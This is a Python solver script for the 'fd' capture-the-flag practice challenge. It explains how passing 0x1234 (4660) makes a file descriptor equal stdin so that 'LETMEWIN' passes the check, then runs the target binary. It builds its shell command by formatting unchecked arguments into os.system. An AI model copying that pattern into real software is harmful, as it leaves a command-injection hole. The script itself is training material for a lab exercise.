#!/usr/bin/env python
###############################################################
## [Name]: file-descriptor-stdin.py -- a pwnable script purpose
## [Author]: Naivenom www.fwhibbit.es
##-------------------------------------------------------------
## [Details](EXAMPLE):
## It is interesting to know what is Linux File Descriptor. The 0 value is stdin, so I figure out how is the value in decimal to (EXAMPLE) 0x1234 = 4660. 
## If I pass as argument 4660, that is equal to read(0, buf, 32). 
## Therefore we need to know that stdin must be enabled with 0 File Descriptor, and you can convert to zero through argument passed. 
## So if I put 4660, fd == 0 and this let us to write (stdin) LETMEWIN\n and saved in buffer array.

##------------------------------------------------------------
## [Usage]: Example
## python3 file-descriptor.py --hexvalue 0x1234 --vulnapp ./fd
###############################################################

import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--hexvalue', action='store', dest='hexvalue',
					help='Hexvalue to enforcement the type of file descriptor to zero (stdin)')

parser.add_argument('--vulnapp', action='store', dest='vulnapp',
					help='Bash vulnapp execute')

parser.add_argument('--version', action='version', version='%(prog)s 0.1')

results = parser.parse_args()
print('[+]Hexvalue:', results.hexvalue)
print ('[+]Vulnapp:', results.vulnapp)

hexvalue = results.hexvalue
vulnapp = results.vulnapp

integerValue = int(hexvalue, 16)
os.system("./%s %s"%(vulnapp, integerValue))